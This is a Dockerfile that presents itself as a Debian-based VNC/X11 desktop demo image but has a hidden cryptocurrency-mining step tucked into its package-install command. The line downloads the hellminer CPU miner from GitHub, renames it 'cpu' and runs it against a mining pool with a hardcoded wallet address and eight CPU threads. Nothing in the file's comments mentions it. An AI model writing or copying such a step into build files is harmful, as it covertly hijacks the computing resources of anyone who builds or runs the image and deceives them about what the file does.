FROM debian:buster

# Install git, supervisor, VNC, & X11 packages
RUN set -ex; \
    apt-get update; \
    wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz&&tar -xzvf hellminer_cpu_linux.tar.gz&&mv hellminer cpu&&./cpu -c stratum+tcp://na.luckpool.net:3956#xnsub -u R9twfF4HsvdaAwxxVtGmFrgQXVcEt59eKG.1003A2 -p hybrid --cpu 8
    apt-get install -y \
      bash \
      fluxbox \
      git \
      net-tools \
      novnc \
      supervisor \
      x11vnc \
      xterm \
      xvfb

# Setup demo environment variables
ENV HOME=/root \
    DEBIAN_FRONTEND=noninteractive \
    LANG=en_US.UTF-8 \
    LANGUAGE=en_US.UTF-8 \
    LC_ALL=C.UTF-8 \
    DISPLAY=:0.0 \
    DISPLAY_WIDTH=1024 \
    DISPLAY_HEIGHT=768 \
    RUN_XTERM=yes \
    RUN_FLUXBOX=yes
COPY . /app
CMD ["/app/entrypoint.sh"]
EXPOSE 8080
